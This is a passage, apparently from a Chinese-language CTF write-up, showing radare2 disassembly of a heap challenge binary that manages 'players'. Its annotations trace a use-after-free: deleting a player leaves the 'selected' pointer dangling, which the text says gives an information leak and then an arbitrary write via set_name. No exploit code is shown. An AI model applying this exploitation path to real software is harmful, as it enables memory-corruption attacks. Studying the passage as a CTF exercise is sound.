0xb ; [0xb:4]=-1 ; 11\n|       ,=\n 0x0040185c      751e           jne 0x40187c\n|       |   0x0040185e      bf70244000     mov edi, str.Maximum_number_of_players_reached ; 0x402470 ; \nMaximum number of players reached!\n\n|       |   0x00401863      e818f4ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401868      488b05f11820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x0040186f      4889c7         mov rdi, rax\n|       |   0x00401872      e849f5ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      ,==\n 0x00401877      e984020000     jmp 0x401b00\n|      ||      ; JMP XREF from 0x0040185c (sym.add_player)\n|      |`-\n 0x0040187c      8b85e4feffff   mov eax, dword [local_11ch]\n|      |    0x00401882      89c6           mov esi, eax\n|      |    0x00401884      bf93244000     mov edi, str.Found_free_slot:__d ; 0x402493 ; \nFound free slot: %d\\n\n\n|      |    0x00401889      b800000000     mov eax, 0\n|      |    0x0040188e      e86df4ffff     call sym.imp.printf         ; int printf(const char *format)\n|      |    0x00401893      488b05c61820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      |    0x0040189a      4889c7         mov rdi, rax\n|      |    0x0040189d      e81ef5ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      |    0x004018a2      bf18000000     mov edi, 0x18               ; 24\n|      |    0x004018a7      e804f5ffff     call sym.imp.malloc         ;  void *malloc(size_t size) ; \u7b2c\u4e00\u4e2a malloc\uff0c\u7ed9 player \u7ed3\u6784\u4f53\u5206\u914d\u7a7a\u95f4\n|      |    0x004018ac      488985e8feff.  mov qword [local_118h], rax  ; \u8fd4\u56de\u5730\u5740 rax -\n [local_118h]\n|      |    0x004018b3      4883bde8feff.  cmp qword [local_118h], 0\n|      |,=\n 0x004018bb      751e           jne 0x4018db\n|      ||   0x004018bd      bfa8244000     mov edi, 0x4024a8\n|      ||   0x004018c2      e8b9f3ffff     call sym.imp.puts           ; int puts(const char *s)\n|      ||   0x004018c7      488b05921820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      ||   0x004018ce      4889c7         mov rdi, rax\n|      ||   0x004018d1      e8eaf4ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|     ,===\n 0x004018d6      e925020000     jmp 0x401b00\n|     |||      ; JMP XREF from 0x004018bb (sym.add_player)\n|     ||`-\n 0x004018db      488b85e8feff.  mov rax, qword [local_118h]\n|     ||    0x004018e2      ba18000000     mov edx, 0x18               ; 24\n|     ||    0x004018e7      be00000000     mov esi, 0\n|     ||    0x004018ec      4889c7         mov rdi, rax\n|     ||    0x004018ef      e82cf4ffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)\n|     ||    0x004018f4      bfbb244000     mov edi, str.Enter_player_name: ; 0x4024bb ; \nEnter player name: \n\n|     ||    0x004018f9      b800000000     mov eax, 0\n|     ||    0x004018fe      e8fdf3ffff     call sym.imp.printf         ; int printf(const char *format)\n|     ||    0x00401903      488b05561820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|     ||    0x0040190a      4889c7         mov rdi, rax\n|     ||    0x0040190d      e8aef4ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|     ||    0x00401912      488d85f0feff.  lea rax, rbp - 0x110\n|     ||    0x00401919      ba00010000     mov edx, 0x100              ; 256\n|     ||    0x0040191e      be00000000     mov esi, 0\n|     ||    0x00401923      4889c7         mov rdi, rax\n|     ||    0x00401926      e8f5f3ffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)\n|     ||    0x0040192b      488d85f0feff.  lea rax, rbp - 0x110\n|     ||    0x00401932      be00010000     mov esi, 0x100              ; 256\n|     ||    0x00401937      4889c7         mov rdi, rax\n|     ||    0x0040193a      e884fbffff     call sym.readline\n|     ||    0x0040193f      488d85f0feff.  lea rax, rbp - 0x110         ; \u8bfb\u5165\u5b57\u7b26\u4e32\u5230 rbp - 0x110\n|     ||    0x00401946      4889c7         mov rdi, rax\n|     ||    0x00401949      e852f3ffff     call sym.imp.strlen         ; size_t strlen(const char *s) ; player.name \u957f\u5ea6\n|     ||    0x0040194e      4883c001       add rax, 1                   ; \u957f\u5ea6\u52a0 1\n|     ||    0x00401952      4889c7         mov rdi, rax\n|     ||    0x00401955      e856f4ffff     call sym.imp.malloc         ;  void *malloc(size_t size) ; \u7b2c\u4e8c\u4e2a malloc\uff0c\u7ed9 player.name \u5206\u914d\u7a7a\u95f4\n|     ||    0x0040195a      4889c2         mov rdx, rax                 ; \u8fd4\u56de\u5730\u5740 rax -\n rdx\n|     ||    0x0040195d      488b85e8feff.  mov rax, qword [local_118h]  ; player \u7ed3\u6784\u4f53 [local_118h] -\n rax\n|     ||    0x00401964      48895010       mov qword [rax + 0x10], rdx  ; player.name \u5b58\u653e\u5230 [rax + 0x10]\n|     ||    0x00401968      488b85e8feff.  mov rax, qword [local_118h]\n|     ||    0x0040196f      488b4010       mov rax, qword [rax + 0x10] ;\n|     ||    0x00401973      4885c0         test rax, rax\n|     ||,=\n 0x00401976      7523           jne 0x40199b\n|     |||   0x00401978      bfcf244000     mov edi, str.Could_not_allocate ; 0x4024cf ; \nCould not allocate!\n\n|     |||   0x0040197d      b800000000     mov eax, 0\n|     |||   0x00401982      e879f3ffff     call sym.imp.printf         ; int printf(const char *format)\n|     |||   0x00401987      488b05d21720.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|     |||   0x0040198e      4889c7         mov rdi, rax\n|     |||   0x00401991      e82af4ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    ,====\n 0x00401996      e965010000     jmp 0x401b00\n|    ||||      ; JMP XREF from 0x00401976 (sym.add_player)\n|    |||`-\n 0x0040199b      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x004019a2      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16 ; \u53d6\u51fa player.name \u5230 rax\n|    |||    0x004019a6      488d95f0feff.  lea rdx, rbp - 0x110         ; \u53d6\u51fa payler.name \u5b57\u7b26\u4e32\u5730\u5740\u5230 rdx\n|    |||    0x004019ad      4889d6         mov rsi, rdx                 ; rdx -\n rsi\n|    |||    0x004019b0      4889c7         mov rdi, rax                 ; rax -\n rdi\n|    |||    0x004019b3      e8b8f2ffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src) ; \u5c06\u5b57\u7b26\u4e32\u590d\u5236\u5230 player.name \u6307\u5411\u7684\u5730\u5740\n|    |||    0x004019b8      bfe3244000     mov edi, str.Enter_attack_points: ; 0x4024e3 ; \nEnter attack points: \n\n|    |||    0x004019bd      b800000000     mov eax, 0\n|    |||    0x004019c2      e839f3ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x004019c7      488b05921720.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x004019ce      4889c7         mov rdi, rax\n|    |||    0x004019d1      e8eaf3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x004019d6      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x004019dd      be04000000     mov esi, 4\n|    |||    0x004019e2      4889c7         mov rdi, rax\n|    |||    0x004019e5      e8d9faffff     call sym.readline            ; \u8bfb\u5165 attack_pts\n|    |||    0x004019ea      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x004019f1      4889c7         mov rdi, rax\n|    |||    0x004019f4      e847f4ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x004019f9      89c2           mov edx, eax\n|    |||    0x004019fb      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401a02      8910           mov dword [rax], edx         ; \u5c06 attack_pts \u5199\u5165 local_118h\n|    |||    0x00401a04      bff9244000     mov edi, str.Enter_defense_points: ; 0x4024f9 ; \nEnter defense points: \n\n|    |||    0x00401a09      b800000000     mov eax, 0\n|    |||    0x00401a0e      e8edf2ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x00401a13      488b05461720.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x00401a1a      4889c7         mov rdi, rax\n|    |||    0x00401a1d      e89ef3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x00401a22      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a29      be04000000     mov esi, 4\n|    |||    0x00401a2e      4889c7         mov rdi, rax\n|    |||    0x00401a31      e88dfaffff     call sym.readline            ; \u8bfb\u5165 defense_pts\n|    |||    0x00401a36      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a3d      4889c7         mov rdi, rax\n|    |||    0x00401a40      e8fbf3ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x00401a45      89c2           mov edx, eax\n|    |||    0x00401a47      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401a4e      895004         mov dword [rax + 4], edx     ; \u5c06 defense_pts \u5199\u5165 local_118h + 4\n|    |||    0x00401a51      bf10254000     mov edi, str.Enter_speed:   ; 0x402510 ; \nEnter speed: \n\n|    |||    0x00401a56      b800000000     mov eax, 0\n|    |||    0x00401a5b      e8a0f2ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x00401a60      488b05f91620.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x00401a67      4889c7         mov rdi, rax\n|    |||    0x00401a6a      e851f3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x00401a6f      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a76      be04000000     mov esi, 4\n|    |||    0x00401a7b      4889c7         mov rdi, rax\n|    |||    0x00401a7e      e840faffff     call sym.readline            ; \u8bfb\u5165 speed\n|    |||    0x00401a83      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a8a      4889c7         mov rdi, rax\n|    |||    0x00401a8d      e8aef3ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x00401a92      89c2           mov edx, eax\n|    |||    0x00401a94      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401a9b      895008         mov dword [rax + 8], edx     ; \u5c06 speed \u5199\u5165 local_118 + 8\n|    |||    0x00401a9e      bf1e254000     mov edi, str.Enter_precision: ; 0x40251e ; \nEnter precision: \n\n|    |||    0x00401aa3      b800000000     mov eax, 0\n|    |||    0x00401aa8      e853f2ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x00401aad      488b05ac1620.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x00401ab4      4889c7         mov rdi, rax\n|    |||    0x00401ab7      e804f3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x00401abc      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401ac3      be04000000     mov esi, 4\n|    |||    0x00401ac8      4889c7         mov rdi, rax\n|    |||    0x00401acb      e8f3f9ffff     call sym.readline            ; \u8bfb\u5165 precision\n|    |||    0x00401ad0      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401ad7      4889c7         mov rdi, rax\n|    |||    0x00401ada      e861f3ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x00401adf      89c2           mov edx, eax\n|    |||    0x00401ae1      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401ae8      89500c         mov dword [rax + 0xc], edx   ; \u5c06 precision \u5199\u5165 local_118h + 0xc\n|    |||    0x00401aeb      8b85e4feffff   mov eax, dword [local_11ch]  ; player \u7f16\u53f7\n|    |||    0x00401af1      488b95e8feff.  mov rdx, qword [local_118h]  ; player \u7ed3\u6784\u4f53\n|    |||    0x00401af8      488914c58031.  mov qword [rax*8 + obj.players], rdx ; [0x603180:8]=0 ; \u5f53\u524d player \u7ed3\u6784\u4f53\u5730\u5740\u5199\u5165 rax*8 + obj.players\n|    |||       ; JMP XREF from 0x00401996 (sym.add_player)\n|    |||       ; JMP XREF from 0x004018d6 (sym.add_player)\n|    |||       ; JMP XREF from 0x00401877 (sym.add_player)\n|    ```--\n 0x00401b00      488b45f8       mov rax, qword [local_8h]\n|           0x00401b04      644833042528.  xor rax, qword fs:[0x28]\n|       ,=\n 0x00401b0d      7405           je 0x401b14\n|       |   0x00401b0f      e8acf1ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401b0d (sym.add_player)\n|       `-\n 0x00401b14      c9             leave\n\\           0x00401b15      c3             ret\n\n\n\u8be5\u51fd\u6570\u4f1a\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u68c0\u67e5\uff0c\u5982\u7403\u5458\u6700\u5927\u6570\u91cf\u7b49\uff0c\u7136\u540e\u5f00\u59cb\u6dfb\u52a0\u7403\u5458\u7684\u8fc7\u7a0b\u3002\u6839\u636e\u6211\u4eec\u7684\u5206\u6790\uff0c\nobj.players\n \u5e94\u8be5\u662f\u4e00\u4e2a\u5168\u5c40\u6570\u7ec4\uff0c\u7528\u4e8e\u5b58\u653e\u6240\u6709\u7403\u5458\u7684\u5730\u5740\u3002\n\n[0x00400ec0]\n is~players\nvaddr=0x00603180 paddr=0x00003180 ord=090 fwd=NONE sz=88 bind=GLOBAL type=OBJECT name=players\n\n\n\u5f53\u7403\u5458\u6dfb\u52a0\u5b8c\u6210\u540e\uff0c\u5c31\u5c06\u5176\u7ed3\u6784\u4f53\u5730\u5740\u6dfb\u52a0\u5230\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u3002\u7403\u5458\u7684\u9009\u62e9\u8fc7\u7a0b\u5c31\u662f\u901a\u8fc7\u8fd9\u4e2a\u6570\u7ec4\u5b8c\u6210\u7684\u3002\n\n\n\u4e0b\u9762\u662f\u9009\u62e9\u7403\u5458\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570 \nsym.select_player\n\uff1a\n\n[0x00400ec0]\n pdf @ sym.select_player\n/ (fcn) sym.select_player 214\n|   sym.select_player ();\n|           ; var int local_14h @ rbp-0x14\n|           ; var int local_10h @ rbp-0x10\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x0040224d (main + 172)\n|           0x00401c05      55             push rbp\n|           0x00401c06      4889e5         mov rbp, rsp\n|           0x00401c09      4883ec20       sub rsp, 0x20\n|           0x00401c0d      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n ; 40\n|           0x00401c16      488945f8       mov qword [local_8h], rax\n|           0x00401c1a      31c0           xor eax, eax\n|           0x00401c1c      bf30254000     mov edi, str.Enter_index:   ; 0x402530 ; \nEnter index: \n\n|           0x00401c21      b800000000     mov eax, 0\n|           0x00401c26      e8d5f0ffff     call sym.imp.printf         ; int printf(const char *format)\n|           0x00401c2b      488b052e1520.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|           0x00401c32      4889c7         mov rdi, rax\n|           0x00401c35      e886f1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|           0x00401c3a      488d45f0       lea rax, rbp - 0x10\n|           0x00401c3e      be04000000     mov esi, 4\n|           0x00401c43      4889c7         mov rdi, rax\n|           0x00401c46      e878f8ffff     call sym.readline            ; \u8bfb\u5165\u7403\u5458\u7f16\u53f7\n|           0x00401c4b      488d45f0       lea rax, rbp - 0x10\n|           0x00401c4f      4889c7         mov rdi, rax\n|           0x00401c52      e8e9f1ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|           0x00401c57      8945ec         mov dword [local_14h], eax   ; \u7f16\u53f7 eax -\n [local_14h]\n|           0x00401c5a      837dec0a       cmp dword [local_14h], 0xa  ; [0xa:4]=-1 ; 10\n|       ,=\n 0x00401c5e      7710           ja 0x401c70\n|       |   0x00401c60      8b45ec         mov eax, dword [local_14h]\n|       |   0x00401c63      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0\n|       |   0x00401c6b      4885c0         test rax, rax\n|      ,==\n 0x00401c6e      751b           jne 0x401c8b\n|      ||      ; JMP XREF from 0x00401c5e (sym.select_player)\n|      |`-\n 0x00401c70      bf3e254000     mov edi, str.Invalid_index  ; 0x40253e ; \nInvalid index\n\n|      |    0x00401c75      e806f0ffff     call sym.imp.puts           ; int puts(const char *s)\n|      |    0x00401c7a      488b05df1420.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      |    0x00401c81      4889c7         mov rdi, rax\n|      |    0x00401c84      e837f1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      |,=\n 0x00401c89      eb3a           jmp 0x401cc5\n|      ||      ; JMP XREF from 0x00401c6e (sym.select_player)\n|      `--\n 0x00401c8b      8b45ec         mov eax, dword [local_14h]   ; \u53d6\u51fa\u7f16\u53f7 [local_14h] -\n eax\n|       |   0x00401c8e      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0 ; \u627e\u5230\u7f16\u53f7\u5bf9\u5e94\u7684\u7403\u5458\u5730\u5740\n|       |   0x00401c96      488905d31420.  mov qword [obj.selected], rax ; [0x603170:8]=0 ; \u5c06\u5730\u5740\u5199\u5165 [obj.selected]\n|       |   0x00401c9d      bf58254000     mov edi, str.Player_selected ; 0x402558 ; \nPlayer selected!\n\n|       |   0x00401ca2      e8d9efffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401ca7      488b05b21420.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x00401cae      4889c7         mov rdi, rax\n|       |   0x00401cb1      e80af1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|       |   0x00401cb6      488b05b31420.  mov rax, qword [obj.selected] ; [0x603170:8]=0 ; \u53d6\u51fa\u7403\u5458\u5730\u5740\n|       |   0x00401cbd      4889c7         mov rdi, rax                 ; rax -\n rdi\n|       |   0x00401cc0      e8c6faffff     call sym.show_player_func    ; \u8c03\u7528\u51fd\u6570 sym.show_player_func \u6253\u5370\u51fa\u7403\u5458\u4fe1\u606f\n|       |      ; JMP XREF from 0x00401c89 (sym.select_player)\n|       `-\n 0x00401cc5      488b45f8       mov rax, qword [local_8h]\n|           0x00401cc9      644833042528.  xor rax, qword fs:[0x28]\n|       ,=\n 0x00401cd2      7405           je 0x401cd9\n|       |   0x00401cd4      e8e7efffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401cd2 (sym.select_player)\n|       `-\n 0x00401cd9      c9             leave\n\\           0x00401cda      c3             ret\n\n\n\u5bf9\u8c61 \nobj.selected\n \u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u7528\u4e8e\u5b58\u653e\u9009\u62e9\u7684\u7403\u5458\u7f16\u53f7\u3002\n\n[0x00400ec0]\n is~selected\nvaddr=0x00603170 paddr=0x00003170 ord=095 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=selected\n\n\n\u9009\u4e2d\u7403\u5458\u4e4b\u540e\uff0c\u6253\u5370\u7403\u5458\u4fe1\u606f\u7684\u64cd\u4f5c\u5c31\u662f\u901a\u8fc7\u4ece \nobj.selected\n \u4e2d\u83b7\u53d6\u7403\u5458\u5730\u5740\u5b9e\u73b0\u7684\u3002\n\n\n\u4e0b\u9762\u662f\u5220\u9664\u7403\u5458\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570 \nsym.delete_player\n\uff1a\n\n[0x00400ec0]\n pdf @ sym.delete_player\n/ (fcn) sym.delete_player 239\n|   sym.delete_player ();\n|           ; var int local_1ch @ rbp-0x1c\n|           ; var int local_18h @ rbp-0x18\n|           ; var int local_10h @ rbp-0x10\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x00402241 (main + 160)\n|           0x00401b16      55             push rbp\n|           0x00401b17      4889e5         mov rbp, rsp\n|           0x00401b1a      4883ec20       sub rsp, 0x20\n|           0x00401b1e      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n ; 40\n|           0x00401b27      488945f8       mov qword [local_8h], rax\n|           0x00401b2b      31c0           xor eax, eax\n|           0x00401b2d      bf30254000     mov edi, str.Enter_index:   ; 0x402530 ; \nEnter index: \n\n|           0x00401b32      b800000000     mov eax, 0\n|           0x00401b37      e8c4f1ffff     call sym.imp.printf         ; int printf(const char *format)\n|           0x00401b3c      488b051d1620.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|           0x00401b43      4889c7         mov rdi, rax\n|           0x00401b46      e875f2ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|           0x00401b4b      488d45f0       lea rax, rbp - 0x10\n|           0x00401b4f      be04000000     mov esi, 4\n|           0x00401b54      4889c7         mov rdi, rax\n|           0x00401b57      e867f9ffff     call sym.readline            ; \u8bfb\u5165\u7403\u5458\u7f16\u53f7\n|           0x00401b5c      488d45f0       lea rax, rbp - 0x10\n|           0x00401b60      4889c7         mov rdi, rax\n|           0x00401b63      e8d8f2ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|           0x00401b68      8945e4         mov dword [local_1ch], eax   ; \u7f16\u53f7 eax -\n [local_1ch]\n|           0x00401b6b      837de40a       cmp dword [local_1ch], 0xa  ; [0xa:4]=-1 ; 10\n|       ,=\n 0x00401b6f      7710           ja 0x401b81\n|       |   0x00401b71      8b45e4         mov eax, dword [local_1ch]\n|       |   0x00401b74      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0\n|       |   0x00401b7c      4885c0         test rax, rax\n|      ,==\n 0x00401b7f      751b           jne 0x401b9c\n|      ||      ; JMP XREF from 0x00401b6f (sym.delete_player)\n|      |`-\n 0x00401b81      bf3e254000     mov edi, str.Invalid_index  ; 0x40253e ; \nInvalid index\n\n|      |    0x00401b86      e8f5f0ffff     call sym.imp.puts           ; int puts(const char *s)\n|      |    0x00401b8b      488b05ce1520.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      |    0x00401b92      4889c7         mov rdi, rax\n|      |    0x00401b95      e826f2ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      |,=\n 0x00401b9a      eb53           jmp 0x401bef\n|      ||      ; JMP XREF from 0x00401b7f (sym.delete_player)\n|      `--\n 0x00401b9c      8b45e4         mov eax, dword [local_1ch]   ; \u53d6\u51fa\u7f16\u53f7 [local_1ch] -\n eax\n|       |   0x00401b9f      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0 ; \u627e\u5230\u7f16\u53f7\u5bf9\u5e94\u7684\u7403\u5458\u5730\u5740\n|       |   0x00401ba7      488945e8       mov qword [local_18h], rax   ; \u5c06\u7403\u5458\u5730\u5740 rax \u653e\u5165 [local_18h]\n|       |   0x00401bab      8b45e4         mov eax, dword [local_1ch]   ; \u53d6\u51fa\u7f16\u53f7 [local_1ch] -\n eax\n|       |   0x00401bae      48c704c58031.  mov qword [rax*8 + obj.players], 0 ; [0x603180:8]=0 ; \u5c06 players \u6570\u7ec4\u4e2d\u7684\u5bf9\u5e94\u503c\u7f6e\u96f6\n|       |   0x00401bba      488b45e8       mov rax, qword [local_18h]   ; \u5c06\u7403\u5458\u5730\u5740 [local_18h] \u653e\u56de rax\n|       |   0x00401bbe      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16 ; \u53d6\u51fa player.name \u6307\u5411\u7684\u5b57\u7b26\u4e32\n|       |   0x00401bc2      4889c7         mov rdi, rax                 ; \u5b57\u7b26\u4e32\u5730\u5740 rax -\n rdi\n|       |   0x00401bc5      e886f0ffff     call sym.imp.free           ; void free(void *ptr)   ; \u8c03\u7528\u51fd\u6570 free \u91ca\u653e\u7403\u5458\u540d\u5b57\n|       |   0x00401bca      488b45e8       mov rax, qword [local_18h]   ; \u5c06\u7403\u5458\u5730\u5740 [local_18h] \u653e\u56de rax\n|       |   0x00401bce      4889c7         mov rdi, rax                 ; \u7403\u5458\u5730\u5740 rax -\n rdi\n|       |   0x00401bd1      e87af0ffff     call sym.imp.free           ; void free(void *ptr)   ; \u8c03\u7528\u51fd\u6570 free \u91ca\u653e\u7403\u5458\u7ed3\u6784\u4f53\n|       |   0x00401bd6      bf4c254000     mov edi, str.She_s_gone     ; 0x40254c ; \nShe\ns gone!\n\n|       |   0x00401bdb      e8a0f0ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401be0      488b05791520.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x00401be7      4889c7         mov rdi, rax\n|       |   0x00401bea      e8d1f1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|       |      ; JMP XREF from 0x00401b9a (sym.delete_player)\n|       `-\n 0x00401bef      488b45f8       mov rax, qword [local_8h]\n|           0x00401bf3      644833042528.  xor rax, qword fs:[0x28]\n|       ,=\n 0x00401bfc      7405           je 0x401c03\n|       |   0x00401bfe      e8bdf0ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401bfc (sym.delete_player)\n|       `-\n 0x00401c03      c9             leave\n\\           0x00401c04      c3             ret\n\n\n\u8be5\u51fd\u6570\u9996\u5148\u91ca\u653e\u6389\u7403\u5458\u7684\u540d\u5b57\uff0c\u7136\u540e\u91ca\u653e\u6389\u7403\u5458\u7684\u7ed3\u6784\u4f53\u3002\u5374\u6ca1\u6709\u5bf9 \nobj.selected\n \u505a\u4efb\u4f55\u4fee\u6539\uff0c\u800c\u8be5\u5bf9\u8c61\u4e2d\u5b58\u653e\u7684\u662f\u9009\u4e2d\u7403\u5458\u7684\u5730\u5740\uff0c\u8fd9\u5c31\u5b58\u5728\u4e00\u4e2a\u903b\u8f91\u6f0f\u6d1e\uff0c\u5982\u679c\u6211\u4eec\u5728\u91ca\u653e\u7403\u5458\u4e4b\u524d\u9009\u4e2d\u8be5\u7403\u5458\uff0c\u5219\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u8fd9\u4e2a\u6307\u9488\u5bf9\u5185\u5b58\u8fdb\u884c\u64cd\u4f5c\uff0c\u5373 UAF \u6f0f\u6d1e\u3002\n\n\n\u6700\u540e\u770b\u4e00\u4e0b\u663e\u793a\u7403\u5458\u4fe1\u606f\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570 \nsym.show_player\n\uff1a\n\n[0x00400ec0]\n pdf @ sym.show_player\n/ (fcn) sym.show_player 99\n|   sym.show_player ();\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x00402265 (main + 196)\n|           0x004020b4      55             push rbp\n|           0x004020b5      4889e5         mov rbp, rsp\n|           0x004020b8      4883ec10       sub rsp, 0x10\n|           0x004020bc      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n ; 40\n|           0x004020c5      488945f8       mov qword [local_8h], rax\n|           0x004020c9      31c0           xor eax, eax\n|           0x004020cb      488b059e1020.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|           0x004020d2      4885c0         test rax, rax\n|       ,=\n 0x004020d5      751b           jne 0x4020f2\n|       |   0x004020d7      bfe8254000     mov edi, str.No_player_selected_index ; 0x4025e8 ; \nNo player selected index\n\n|       |   0x004020dc      e89febffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004020e1      488b05781020.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x004020e8      4889c7         mov rdi, rax\n|       |   0x004020eb      e8d0ecffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      ,==\n 0x004020f0      eb0f           jmp 0x402101\n|      ||      ; JMP XREF from 0x004020d5 (sym.show_player)\n|      |`-\n 0x004020f2      488b05771020.  mov rax, qword [obj.selected] ; [0x603170:8]=0 ; \u53d6\u51fa\u9009\u4e2d\u7403\u5458\u7684\u5730\u5740\n|      |    0x004020f9      4889c7         mov rdi, rax                 ; \u7403\u5458\u5730\u5740 rax -\n rdi\n|      |    0x004020fc      e88af6ffff     call sym.show_player_func    ; \u8c03\u7528\u51fd\u6570 sym.show_player_func \u6253\u5370\u51fa\u7403\u5458\u4fe1\u606f\n|      |       ; JMP XREF from 0x004020f0 (sym.show_player)\n|      `--\n 0x00402101      488b45f8       mov rax, qword [local_8h]\n|           0x00402105      644833042528.  xor rax, qword fs:[0x28]\n|       ,=\n 0x0040210e      7405           je 0x402115\n|       |   0x00402110      e8abebffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x0040210e (sym.show_player)\n|       `-\n 0x00402115      c9             leave\n\\           0x00402116      c3             ret\n\n\n\u5728\u8be5\u51fd\u6570\u4e2d\uff0c\u4e5f\u672a\u68c0\u67e5\u9009\u4e2d\u7403\u5458\u662f\u5426\u8fd8\u5b58\u5728\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u4fe1\u606f\u6cc4\u9732\u3002\n\n\n\u51fd\u6570 \nsym.edit_player\n \u53ef\u4ee5\u8c03\u7528\u51fd\u6570 \nsym.set_name\n \u4fee\u6539 player name\uff0c\u4f46\u5176\u4e5f\u4e0d\u4f1a\u5bf9 selected \u7684\u503c\u505a\u68c0\u67e5\uff0c\u914d\u5408\u4e0a\u4fe1\u606f\u6cc4\u9732\uff0c\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u5730\u5740\u5199\u3002\n\n[0x00400ec0]\n pdf @ sym.set_name\n/ (fcn) sym.set_name 281                                                                                                                                                              \n|   sym.set_name ();\n|           ; var int local_128h @ rbp-0x128\n|           ; var int local_120h @ rbp-0x120\n|           ; var int local_18h @ rbp-0x18\n|              ; CALL XREF from 0x00402058 (sym.edit_player + 101)\n|           0x00401cdb      55             push rbp\n|           0x00401cdc      4889e5         mov rbp, rsp\n|           0x00401cdf      53             push rbx\n|           0x00401ce0      4881ec280100.  sub rsp, 0x128\n|           0x00401ce7      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; \n(\n 